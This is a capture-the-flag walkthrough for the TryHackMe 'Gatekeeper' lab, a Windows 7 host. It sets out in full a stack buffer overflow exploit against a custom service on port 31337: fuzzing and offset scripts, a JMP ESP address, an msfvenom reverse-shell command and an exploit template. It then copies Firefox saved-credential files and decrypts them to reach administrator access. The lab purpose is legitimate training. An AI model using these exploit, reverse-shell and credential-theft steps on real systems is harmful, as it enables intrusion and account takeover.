# Gatekeeper

Can you get past the gate and through the fire?

Defeat the Gatekeeper to break the chains.  But beware, fire awaits on the other side.

Room: https://tryhackme.com/room/gatekeeper

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/gatekeeper.md

------------------

## Enumeration

A full TCP scan identified several Windows services and one unusual custom service on port `31337`.

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt 10.67.134.52
```

Interesting ports:

```text
135/tcp    Microsoft RPC
139/tcp    NetBIOS
445/tcp    SMB
3389/tcp   RDP
31337/tcp  Custom service
```

The host was identified as:

```text
Windows 7 Professional 7601 Service Pack 1
Hostname: GATEKEEPER
Workgroup: WORKGROUP
```

SMB enumeration showed an accessible `Users` share.

```bash
smbclient -L //10.67.134.52/ -N
```

Output showed:

```text
ADMIN$
C$
IPC$
Users
```

Connecting to the `Users` share revealed a `Share` directory containing the vulnerable binary.

```bash
smbclient //10.67.134.52/Users -N
```

Inside SMB:

```text
recurse ON
prompt OFF
mget *
```

The important file was:

```text
Share/gatekeeper.exe
```

---

## Custom Service Testing

The custom service on port `31337` echoed input back with a `Hello` prefix.

```bash
nc 10.67.134.52 31337
```

Example:

```text
hello
Hello hello!!!
```

A basic fuzzing script showed the service crashed around a few hundred bytes.

```python
#!/usr/bin/env python3
import socket

ip = "10.67.134.52"
port = 31337

for size in [100, 500, 1000, 1500, 2000]:
    try:
        payload = b"A" * size
        s = socket.socket()
        s.settimeout(3)
        s.connect((ip, port))
        s.sendall(payload + b"\r\n")
        print(f"[+] Size {size}: {s.recv(100)!r}")
        s.close()
    except Exception as e:
        print(f"[!] Size {size}: {e}")
        break
```

The service reset at `500` bytes and then refused connections until restarted, confirming a crash.

---

## Binary Analysis

Basic file inspection confirmed the binary was a 32-bit Windows executable.

```bash
file gatekeeper.exe
```

```text
PE32 executable (console) Intel 80386, for MS Windows
```

Using `rabin2` showed weak protections:

```bash
rabin2 -I gatekeeper.exe
```

Important findings:

```text
arch     x86
bits     32
canary   false
nx       false
pic      false
baddr    0x8040000
```

Strings also revealed the intended training binary path:

```bash
strings gatekeeper.exe
```

Interesting string:

```text
dostackbufferoverflowgood
```

This strongly indicated a stack buffer overflow challenge.

---

## Local Debugging with Wine

Because no Windows machine was available, the binary was run under Wine on the AttackBox.

```bash
wine gatekeeper.exe
```

The binary listened locally on port `31337`.

A cyclic pattern was generated with a Python helper script because the Metasploit pattern tools had Ruby version issues on the AttackBox.

```python
#!/usr/bin/env python3
import string
import sys

def pattern_create(length):
    out = ""
    for a in string.ascii_uppercase:
        for b in string.ascii_lowercase:
            for c in string.digits:
                out += a + b + c
                if len(out) >= length:
                    return out[:length]
    return out[:length]

def pattern_offset(value, length=5000):
    pat = pattern_create(length)
    value = value.strip()

    candidates = []

    if value.startswith("0x"):
        value = value[2:]

    if len(value) == 8 and all(x in "0123456789abcdefABCDEF" for x in value):
        raw = bytes.fromhex(value)
        candidates.append(raw[::-1].decode("latin-1", errors="ignore"))
        candidates.append(raw.decode("latin-1", errors="ignore"))
    else:
        candidates.append(value)

    for c in candidates:
        idx = pat.find(c)
        if idx != -1:
            print(f"[*] Match: {c!r}")
            print(f"[+] Offset: {idx}")
            return

    print("[-] No match found")

if len(sys.argv) == 3 and sys.argv[1] == "-l":
    print(pattern_create(int(sys.argv[2])))
elif len(sys.argv) == 3 and sys.argv[1] == "-q":
    pattern_offset(sys.argv[2])
else:
    print("Usage:")
    print("  python3 pattern.py -l 500")
    print("  python3 pattern.py -q 39654138")
```

Generate a pattern:

```bash
python3 pattern.py -l 500 > pattern.txt
```

Send the pattern to the local Wine process:

```python
#!/usr/bin/env python3
import socket

payload = open("pattern.txt", "rb").read().strip()

s = socket.socket()
s.connect(("127.0.0.1", 31337))
s.sendall(payload + b"\r\n")
s.close()
```

Wine crashed with:

```text
EIP: 39654138
```

Calculating the offset:

```bash
python3 pattern.py -q 39654138
```

Result:

```text
Offset: 146
```

---

## Confirming EIP Control

A test payload was sent to confirm control of `EIP`.

```python
#!/usr/bin/env python3
import socket

ip = "127.0.0.1"
port = 31337

offset = 146

payload  = b"A" * offset
payload += b"B" * 4
payload += b"C" * 300

s = socket.socket()
s.connect((ip, port))
s.sendall(payload + b"\r\n")
s.close()
```

Wine confirmed:

```text
EIP: 42424242
```

This confirmed control of instruction flow.

---

## Finding JMP ESP

`ROPgadget` was used to locate a suitable `JMP ESP` instruction in the main executable.

```bash
ROPgadget --binary gatekeeper.exe | grep -Ei "jmp esp"
```

Result:

```text
0x080414c3 : jmp esp
```

Little-endian format:

```python
jmp_esp = b"\xc3\x14\x04\x08"
```

---

## Exploit Development

Shellcode was generated with `msfvenom`.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.67.88.146 LPORT=4444 EXITFUNC=thread -b '\x00\x0a\x0d' -f python -v shellcode
```

Final payload structure:

```text
"A" * 146
JMP ESP
NOP sled
Shellcode
```

Exploit template:

```python
#!/usr/bin/env python3
import socket

ip = "10.67.134.52"
port = 31337

offset = 146
jmp_esp = b"\xc3\x14\x04\x08"

shellcode =  b""
# msfvenom shellcode goes here

payload  = b"A" * offset
payload += jmp_esp
payload += b"\x90" * 32
payload += shellcode

print(f"[+] Payload length: {len(payload)}")

s = socket.socket()
s.connect((ip, port))
s.sendall(payload + b"\r\n")
s.close()
```

A listener was started:

```bash
rlwrap -cAr nc -lvnp 4444
```

Running the exploit returned a shell:

```text
Microsoft Windows [Version 6.1.7601]

C:\Users\natbat\Desktop>
```

---

## User Flag

The user flag was found on `natbat`’s desktop.

```cmd
dir
type user.txt.txt
```

User flag:

```text
{H4lf_****h3r3}
```

---

## Privilege Escalation Enumeration

The current user had limited privileges.

```cmd
whoami /priv
whoami /groups
net user
net localgroup administrators
```

Local users:

```text
Administrator
Guest
mayor
natbat
```

Administrators group:

```text
Administrator
mayor
```

A Firefox shortcut on the desktop suggested saved browser credentials may be useful.

Firefox profiles were found under:

```cmd
dir /a C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles
```

Profiles:

```text
ljfn812a.default-release
rajfzh3y.default
```

The active profile contained saved login files:

```cmd
dir /a C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
```

Important files:

```text
logins.json
key4.db
cert9.db
```

---

## Extracting Firefox Credentials

The files were copied into the existing SMB share path:

```cmd
copy C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\logins.json C:\Users\Share\logins.json
copy C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\key4.db C:\Users\Share\key4.db
copy C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\cert9.db C:\Users\Share\cert9.db
```

Then they were downloaded from the AttackBox:

```bash
mkdir -p ~/gatekeeper-firefox
cd ~/gatekeeper-firefox
smbclient //10.67.134.52/Users -N -c 'cd Share; get logins.json; get key4.db; get cert9.db'
```

The files were placed into a fake Firefox profile directory:

```bash
mkdir -p ~/ffprofile/ljfn812a.default-release
cp ~/gatekeeper-firefox/logins.json ~/ffprofile/ljfn812a.default-release/
cp ~/gatekeeper-firefox/key4.db ~/ffprofile/ljfn812a.default-release/
cp ~/gatekeeper-firefox/cert9.db ~/ffprofile/ljfn812a.default-release/
```

`firefox_decrypt` was used to decrypt the saved login.

```bash
git clone https://github.com/unode/firefox_decrypt.git
python3.9 firefox_decrypt/firefox_decrypt.py ~/ffprofile/ljfn812a.default-release
```

Recovered credential:

```text
Username: mayor
Password: 8CL7O1N*********
```

---

## Root Flag

The recovered `mayor` credentials allowed access to the administrative `C$` share.

```bash
smbclient //10.67.134.52/C$ -U 'mayor%PASSWORD'
```

The root flag was found on `mayor`’s desktop:

```text
\Users\mayor\Desktop\root.txt.txt
```

Inside `smbclient`:

```text
cd Users\mayor\Desktop
ls
get root.txt.txt
```

Then locally:

```bash
cat root.txt.txt
```

Root flag:

```text
{Th3_M4y0****l4t3s_U}
```

---

## Notes and Lessons Learned

The initial foothold came from a classic 32-bit stack buffer overflow in a custom Windows service.

Important exploit values:

```text
Offset: 146
JMP ESP: 0x080414c3
Little-endian: \xc3\x14\x04\x08
Bad chars excluded: \x00\x0a\x0d
```

Wine was sufficient for local crash analysis and offset discovery, so a Windows debugger was not required.

The privilege escalation path was not kernel-based. The desktop Firefox shortcut was the main hint, and Firefox saved credentials provided the `mayor` administrator credentials.

`smbclient` does not support `cat` or `type` directly. Files need to be downloaded with `get`, then read locally.

---

## Attack Chain Summary

```text
Nmap scan
SMB enumeration
Download gatekeeper.exe
Fuzz custom service
Find BOF offset
Find JMP ESP
Generate reverse shell payload
Exploit port 31337
Read user flag
Extract Firefox logins.json/key4.db/cert9.db
Decrypt saved Firefox credentials
Authenticate as mayor over SMB
Read root flag
```

